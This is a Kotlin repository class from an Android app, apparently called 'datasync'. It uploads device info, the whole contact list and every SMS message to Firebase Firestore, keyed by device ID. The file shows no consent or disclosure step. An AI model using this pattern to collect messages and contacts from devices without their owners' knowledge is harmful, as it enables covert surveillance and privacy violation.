package com.datasync.user.data

import com.datasync.user.model.Contact
import com.datasync.user.model.DeviceInfo
import com.datasync.user.model.SMS
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.tasks.await

class FirestoreRepository {
    private val db = FirebaseFirestore.getInstance()

    suspend fun updateDeviceInfo(deviceInfo: DeviceInfo) {
        db.collection("devices")
            .document(deviceInfo.deviceId)
            .set(deviceInfo)
            .await()
    }

    suspend fun syncContacts(deviceId: String, contacts: List<Contact>) {
        val docRef = db.collection("devices")
            .document(deviceId)
            .collection("contacts")
            .document("all")

        // Store as array in one document as requested
        val data = mapOf("list" to contacts)
        docRef.set(data).await()
    }

    suspend fun syncSMS(deviceId: String, smsList: List<SMS>) {
        val docRef = db.collection("devices")
            .document(deviceId)
            .collection("sms")
            .document("all")

        val data = mapOf("list" to smsList)
        docRef.set(data).await()
    }
}
